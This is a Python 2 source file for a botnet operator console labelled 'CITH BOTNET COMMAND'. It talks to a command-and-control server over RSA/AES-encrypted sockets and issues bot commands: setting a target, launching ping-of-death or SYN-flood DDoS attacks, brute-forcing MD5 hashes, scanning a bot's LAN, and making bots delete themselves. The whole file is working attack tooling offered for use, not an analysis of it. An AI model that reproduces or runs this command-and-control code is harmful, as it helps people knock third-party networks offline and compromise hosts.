import rsa
import socket
import select
import string
import sys
import random
import os
from Crypto.Cipher import AES
import base64
import itertools
# for fancy ui ######################
from colorama import init
from termcolor import cprint
from pyfiglet import figlet_format
init(strip=not sys.stdout.isatty()) # strp colors if stdout is redir.
#####################################
'''
PROCESS_COMMAND FUNCTION
------------------------
(description)

- will process commands to determine if it is to:
	[1] initiate a DOS attacl
		- it will need a target address and port.
		- need a duration of attack.
		- need a specified accack method that is supported.
		
			current supported attacks:
	
		- will return xxxATT200 or xxxATT500 code to server once done so server knows which bots are done.
	
	[2] initiate parallelized task
		- will receive task goal from server.
		- will return result of task to server with special code PARTAS200 or PARTAS500.

	[3] perform recon technique
		- will attempt to scan LAN.
		- will return list of active hosts appended to RECONT200 code. otherwise RECONT500.
	
	[4] will kill itself
		- will delete itself from host machine after returning IAMDED200 code. If fail it will return IAMDED500 to server.
'''

#def process_command(c):
#	print "processing command <{}>...".format(c)
def prompt_display():
	sys.stdout.write("--> ")
	sys.stdout.flush()


def login(socket, attempt):
	# MUST BE DIRLOG200 {PW}encrypted
	m = 'DIRLOG200 ' + base64.b64encode( en_object.encrypt(pad16(attempt)) )
	print "[DEBUG] sending pw message: <{}>".format(m)
	socket.send(m)
	data = socket.recv(IN_BUFFER)
	data_tok = data.split(' ')
	if data_tok[0] == 'DIRLOG200':
		print "[+] SUCCESS."
		return True
	elif data_tok[0] == 'DIRLOG500':
		print "[-] FAIL. try again. received <{}>".format(data_tok[0])
		return False
	else:
		print "[-] ERROR: received unexpected response from server at login <{}>.".format(data_tok[0])
		return False
##################################################################
def process_result(result):
	print "processing result..."
	'''
	this function has to receive th eformatted messages from the server and display them appropriately.
	something like:
	[1] for DOS attacks,
		print BOT results
	[2] for parallelized task,
		print BOT result (i.e. found word or not).
	[3] for recon,
		print BOT LAN info.
	[4] for clean up,
		print BOT suicide status.
	'''
	
	result_tok = result.split(' ')
	print "[DEBUG] processing result: {}".format(result_tok)
	if result_tok[0] == 'BOTSON200':
		bots = ' '.join(result_tok[1:])
		blist = bots.split('|')
		print "***************************************"
		print "\n\tBOTS ONLINE\n---------------------------------"
		for x in blist:
			print "- BOT ONLINE: <{}>".format(x)
		print "---------------------------------\n"
		print "***************************************"
	
	if result_tok[0] == 'SETTAR200':
		print '[*] BOT #[{}] set updated target succesfully.'.format(result_tok[1])
	if result_tok[0] == 'SETTAR500':
		print '[*] BOT #[{}] failed to update target.'.format(result_tok[1])
	if result_tok[0] == 'DOSPOD200' or result_tok[0] == 'DOSSYN200':
		print '[*] BOT #[{}] completed specified DOS attack succesfully.'.format(result_tok[1])
	if result_tok[0] == 'DOSPOD500' or result_tok[0] == 'DOSSYN500':
		print '[*] BOT #[{}] failed to complete specified DOS attack.'.format(result_tok[1])
	if result_tok[0] == 'CRACKR200':
		print '[*] BOT #[{}] cracked hash with solution: <{}>.'.format(result_tok[2], result_tok[1])
	if result_tok[0] == 'CRACKR500':
		print '[*] BOT #[{}] failed to crack provided hash.'.format(result_tok[1])
	if result_tok[0] == 'IAMDED200':
		print '[*] BOT #[{}] succesfully killed itself.'.format(result_tok[1])
	if result_tok[0] == 'IAMDED500':
		print '[*] BOT #[{}] failed to kill itself.'.format(result_tok[1])		
	if result_tok[0] == 'RECONR200':
		print '[*] BOT #[{}] reports:\n <{}>.'.format(result_tok[len(result_tok)-1], ' '.join(result_tok[1:-1]))
	if result_tok[0] == 'RECONR500':
		print '[*] BOT #[{}] failed to report on its LAN.'.format(result_tok[1])		
			
		

#################################################################
def process_input(message):
	'''
				AVAILABLE COMMANDS
				------------------
					- LIST						list all bots online
					
					- TARGET xx.xx.xx.xx		set target for all bots
					
					- DDOS POD					launch ping of death attack on target from all online bots
					
					- DDOS SYN					launch syn flood attack on target from all online bots

					- CRACK						perform test bruteforce dictionary attack on md5 hash.
												mainly as a proof-of-concept but can be extended to serve
												actual functionality.

					- KILL <BOT#>				kill bot with assigned number

					- KILLALL					kill all bots.	

					- RECON <BOT#>				get LAN info from bot #
	'''
	m_tok = message.split(' ')
	print "processing input: {}".format(m_tok)
	if m_tok[0] == 'LIST':
		print "[*] sending list request..."
		return 'BOTSON100'

	if m_tok[0] == 'TARGET':
		print "[*] NOTE: target IP should be of form xx.xx.xx.xx."
		if len(m_tok) < 2:
			return 'FAIL'
		print "[*] sending target set request..."
		return 'SETTAR100 '+ m_tok[1]

	if m_tok[0] == 'DDOS':
		if len(m_tok) < 2:
			return 'FAIL'	
		if m_tok[1] == 'POD' or m_tok[1] == 'SYN':
			print "[*] commencing DDOS attack..."
			return 'DOS'+m_tok[1]+'100'
		else:
			print '[-] supported DOS attacks are POD, SYN.'
			return 'FAIL'

	if m_tok[0] == 'CRACK':
		if len(m_tok) < 2:
			return 'FAIL'
		
		else:
			print "[*] sending crack request for hash {}...".format(m_tok[1])
			return 'CRACKR100 ' + m_tok[1]
	
	if m_tok[0] == 'KILL':
		if len(m_tok) < 2:
			return 'FAIL'
		print "[*] sending kill request for bot <{}>...".format(m_tok[1])
		return 'KILLBO100 ' + m_tok[1]

	if m_tok[0] == 'KILLALL':
		print "[*] sending killall signal..."
		return 'KILLAL100'
	
	if m_tok[0] == 'RECON':
		if len(m_tok) < 2:
			return 'FAIL'
		print "[*] sending recon request to bot <>".format(m_tok[1])
		return 'RECONR100 ' + m_tok[1]

	return 'FAIL'
#################################################################
def encrypt_and_send(sock, message):
	m = pad16(message)
	m1 = 'E'+ base64.b64encode( en_object.encrypt(m) )
	if DEBUG:
		print "sending message [{}] of length: {}".format(m1, len(m1))
	sock.send( m1 )

'''
WRAPPER ENCRYPT/DECRYPT FUNCTIONS <HELPER>
----------------------------------
help with encryption and decryption using assets from rsa.py
'''


def encrypt(message, pub_key):
	#en_message = message.encode('utf8')
	en_message = rsa.encrypt(message, pub_key)
	return en_message

def decrypt(message, pri_key):
	de_message = rsa.decrypt(message, pri_key)
	return de_message

# pad16 function used for AES encryption
def pad16(m):
	i = 1    
	diff = 0
	while (len(m) > 16*i):
		i += 1
	diff = (i*16)-len(m)
	return m + diff*'@'

def depad16(m):
	m = m.split('@')
	#m = filter(None, m)
	m = ''.join(m[0:-1])
	return m



'''
MAIN FUNCTION
--------------

> main funciton. Follows:
__________________________________________________________________

(NEED TO UPDATE)

(2) if (1) decides AES, apropriate objects from pyCrypto lib are
	created for encryption and decryption using
	"randomly" created shared key and IV using os.urandom()

(3) create client socket (to communicate with server).
	connect to server.

(4) expect and receive server public RSA key. Store.

(5) depending on (1), send server either client public key or
	shared key and IV (using RSA encryption with server public key)

	- when sending either key, a special message forrmat is used:
	
		for RSA public keys we use format:
		
		PUBKEY200 (value of n) (value of e)

		for AES shared secret we use format:
	
		AESKEY200 { (KEY)@!delim!@(IV) }_SERVER PUB_KEY

		note here the format is plaintext "AESKEY200"
		followed by the key and IV separated by a special
		delimiter (@!delim!@) encrypted using the server public key.

(6) begin actively servicing messages from server (while loop):

	(6a) create list of possible file descriptors to read from:
		[sys.stdin, client_socket]
	
	(6b) use select() to determine what has data to read.
		(i)  if sys.stdin then we are sending a message ot the server.
		(ii) if client_socket then we have received a message.
	
	in the case of (i) we prepend an 'E' to the message read from
	stdin and encrypt using method established by (1).
	use socket.send() to send message.
	Note if using AES we must also base64 encode the ciphertext.

	in the case of (ii) we check for empty data (and exit).
	if data is not empty we check to see if there is a prepended
	'E' character. If so we use the decyption method corresponding
	to what was decided in (1). We decrypt everything after the 'E'
	and display that to the user.
	If no 'E' is present we just display the data to the user without
	decryption.
'''
if __name__=="__main__":
	# PARSE command line arguments
	DEBUG = 0

	
	NO_ENCRYPTION = 0
	if len(sys.argv) < 3:
		print 'error, usage is of form:\n\tpython director.py hostname/IP port'
		sys.exit()
	if len(sys.argv) == 4:
		if sys.argv[3] == "NO_ENCRYPTION":
			NO_ENCRYPTION = 1
	HOST = sys.argv[1]
	PORT = int(sys.argv[2])
	IN_BUFFER = 16384
	#KEY_SIZE = 1024
	#client_public, client_private = generate_key_pair(KEY_SIZE)
	GOTPUBKEY = 0
	SENTAES = 0
	# ask user if AES should be used.
	USE_AES = 0
	if not NO_ENCRYPTION:
		response = 'y'
	else:
		response = 'n'

	if (response == 'y'):
		USE_AES 	= 1
		key256		= os.urandom(32)
		iv			= os.urandom(16) # 16 byte IV
		en_object	= AES.new(key256, AES.MODE_CBC, iv)
		de_object	= AES.new(key256, AES.MODE_CBC, iv)


	client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	client_socket.settimeout(4)
	
	# sanity check
	#if DEBUG and USE_AES:
	test 	= 'dog'
	entest 	= en_object.encrypt(pad16(test))
	detest	= de_object.decrypt(entest)
	print "[CHECK] detest type: {}".format(type(detest))
	print "[CHECK] SANITY CHECK: [{}] ENCRYPTS TO [{}]".format(test, entest)
	print "[CHECK] which decrypts to [{}]".format(detest)	
	##


	# ATTEMPT TO CONNECT TO SERVER
	try:
		print "[*] attempting to connect to {} at port {}... ".format(HOST,PORT)
		client_socket.connect((HOST, PORT))
	except:
		print "[-] connection attempt failed. exiting..."
		sys.exit()
	
	print "[+] connected to remote host {} at port {}.".format(HOST, PORT)
	
	######################################################################
	# GET SERVER PUBLIC KEY.
	data = client_socket.recv(IN_BUFFER)
	data_tok = data.split(' ')
	if data_tok[0] == 'PUBKEY200':
		n_server = long(data_tok[1])
		e_server = int(data_tok[2])
		server_public = rsa.PublicKey(n_server, e_server)
		print '[*] received server public key.'
		GOTPUBKEY = 1
	else:
		print "ERROR: (unexpected) did not receive public key from server."
		client_socket.close()
		sys.exit()

	
	# SEND KEY TO SERVER
	print '[*] SENDING KEY TO SERVER.'	

	if USE_AES and GOTPUBKEY:
		#sys.stdin.readline()
		print "[*] sending AES shared secret using RSA encryption."
		message = 'AESKEY200 '+ base64.b64encode(encrypt(key256, server_public))+ ' ' + base64.b64encode(encrypt(iv, server_public))
		if DEBUG:
			print 'sending: [{}]'.format(message)
		client_socket.send(message)
		m = client_socket.recv(IN_BUFFER)
		sys.stdout.write(m)
		#SENTAES = 1
		#sys.stdin.readline()


	######################################################################
	print "****************************************************************"
	print "================================================================"
	cprint(figlet_format('CITH BOTNET COMMAND', font='epic'), 'red', attrs=['bold'])
	print "================================================================"
	print "****************************************************************"


	#print "--------------------------------------------\n{}\n--------------------------------------------\n".format(welcome_messages[random.randint(0, len(welcome_messages)-1 )])
	
	
	#sys.stdin.flush()
	# LOGIN #####################################################################
	#ready = client_socket.recv(IN_BUFFER)
	#while(not "LOGRDY" in ready):
	#	ready = client_socket.recv(IN_BUFFER)
	#	print 'waiting on server...'
	attempt = raw_input('C&C SERVER LOGIN PASSWORD: ')	
	#if DEBUG:
	#	print "[DEBUG] read in pw attempt: <{}>".format(attempt)
	res = login(client_socket, attempt)
	while(res == False):
		attempt = raw_input('C&C SERVER LOGIN PASSWORD: ')	
		res = login(client_socket, attempt)
	print "************************************************************\n"
	print "\t\tAVAILABLE COMMANDS\n\t\t------------------\n\t- LIST\t\t\t\tlist all bots online\n\t- TARGET xx.xx.xx.xx\t\tset target for all bots\n\t- DDOS POD\t\t\tlaunch ping of death attack on target from all online bots\n\t- DDOS SYN\t\t\tlaunch syn flood attack on target from all online bots\n\t- CRACK\t\t\t\tperform test bruteforce dictionary attack on md5 hash.\n\t\t\t\t\tmainly as a proof-of-concept but can be extended to serve\n\t\t\t\t\tactual functionality.\n\t- KILL <BOT#>\t\t\tkill bot with assigned number\n\t- KILLALL\t\t\tkill all bots.\n\t- RECON <BOT#>\t\t\tget LAN info from bot #"
	print "\n************************************************************"

	#############################################################################
	while True:
		#command = 'NAN'
		stat = 0
		socket_list = [sys.stdin, client_socket]
		# use select to get readable sockets.
		read_socket, write_socket, error_socket = select.select(socket_list, [], [])

		for socc in read_socket:
			# case [1] user receives brodcast from server.
			# display inbound messages from server (i.e. broadcasted)
			if socc == client_socket:
				data = socc.recv(IN_BUFFER)
				if not data:
					if DEBUG:
						print "[DEBUG] NOT DATA in {} with data [{}]".format(socc.fileno(), data)
					print "\n[*] connection closed--disconnected from not-suspicious server."
					sys.exit()
				else:
					print "[*] got a response."
					'''
					- here anything received that is not encrypted is to be written to stout.
					- commands will be encrypted,
					'''
					data_tok = data.split(' ')

					if data[0] != 'E':
						sys.stdout.write(data)
					else:
						#command = 'NAN' # null command
						if USE_AES:
							result = depad16( de_object.decrypt( base64.b64decode(data[1:]) ) ) 
							if DEBUG:
								print "[DEBUG] received result: <{}>".format(result) 
					#if command != 'NAN':
						stat = process_result(result)
					print "[*] completed result processing with code {}".format(stat)
									
			
			#THIS SECTION IS FOR IF STDIN SUPPORT IS DESIRED. CURRENTLY NOT IMPLMENTED (no reason to)
			
			# case [2] bot submitted message.
			# outbound requires encryption (implemented)
			else:

				# case [2] enctryption here
				#message = sys.stdin.readline()
				message = raw_input("[COMMAND] -> ")
				'''
				AVAILABLE COMMANDS
				------------------
					- LIST ALL					list all bots online
					
					- TARGET xx.xx.xx.xx		set target for all bots
					
					- DDOS POD					launch ping of death attack on target from all online bots
					
					- DDOS SYN					launch syn flood attack on target from all online bots

					- CRACK						perform test bruteforce dictionary attack on md5 hash.
												mainly as a proof-of-concept but can be extended to serve
												actual functionality.

					- KILL <BOT#>				kill bot with assigned number

					- KILLALL					kill all bots.
					
				'''
				processed_message = process_input(message)
		
				if DEBUG:
					print "processed_message: {}".format(processed_message)
				if NO_ENCRYPTION:
					client_socket.send(processed_message)

				elif USE_AES and processed_message != 'FAIL':			
					encrypt_and_send(client_socket, processed_message)
				
				#prompt_display()
			

	
